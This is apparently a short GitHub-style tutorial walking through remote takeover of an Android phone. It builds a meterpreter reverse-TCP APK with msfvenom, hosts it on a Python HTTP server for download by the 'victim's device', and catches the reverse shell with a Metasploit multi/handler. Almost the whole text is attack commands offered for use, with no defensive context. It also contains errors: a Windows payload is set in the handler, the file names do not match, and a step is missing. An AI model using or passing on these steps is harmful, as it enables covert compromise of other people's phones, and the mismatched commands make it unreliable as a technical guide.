## TERMINAL-1. 


STEP 1 -  sudo su 

STEP 2 -  cd

STEP 3 -  cd

STEP 5 -  msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.74 LPORT=4444 R> filename.apk 

______________________________________________________________________________________________________________________________________________________________________________________

Here's what each option in the command means:

_____________________________________________________________________________________________________________________________________________
_________________________________________

|–platform android: set the target platform to android

|-p android/meterpreter/reverse_tcp: set the payload to a reverse TCP meterpreter

|LHOST=192.168.0.74: set the local host to the kali linux machine ip address

|LPORT=4444: set the local port to whatever port you want

______________________________________________________________________________________________________________________________________________________________________________________

payload will be generated. Open the file explorer in kali,
look for the payload then open a new terminal in that location where there is payload. 


## TERMINAL-2.

STEP 6 -  python3 -m http.server     (running a simple http server so that the payload can be downloaded on the victims machine.)
now go back to the TERMINAL-1.


STEP 7 -  use exploit/multi/handler      (command designed for creating reverse shell connections.)

STEP 8 -  set payload windows/meterpreter/reverse_tcp   

STEP 9 -  set LHOST 192.168.0.74       (set LHOST <Kali Linux IP> which was given in the payload as well)

STEP 10 -  set LPORT 4444               (set LPORT <port> the same port number that was given while creating the payload)

STEP 11 -  exploit        (to run the commands you can use either "exploit" or "run" command)

STEP 12 -  help       (to view the command that can be run after the sucessfull reverse shell of android)

______________________________________________________________________________________________________________________________________________________________________________________


To download the payload in victim's device you need to open the browser and type 


STEP 13 -  192.168.0.74/payload.apk     (kali linux ip address which is used in the lhost/the payload file name)

STEP 14 -  hit enter 

STEP 15 -  The payload will start downloading.
______________________________________________________________________________________________________________________________________________________________________________________







____________________________________________________________________________________________________________________________________________
▶ Name: StromWise

▶ Role: Creator

▶ Location: Unknown

▶ GitHub: https://github.com/stromwise 

▶ Instagram: https://www.instagram.com/stromwise/ 

▶ Facebook: https://www.facebook.com/profile.php?id=100093706328777

▶ Youtube: https://www.youtube.com/channel/UC-tafc0TqgZNnQio8Gj-hjg 

▶ Twitter: https://twitter.com/StromWise 
____________________________________________________________________________________________________________________________________________


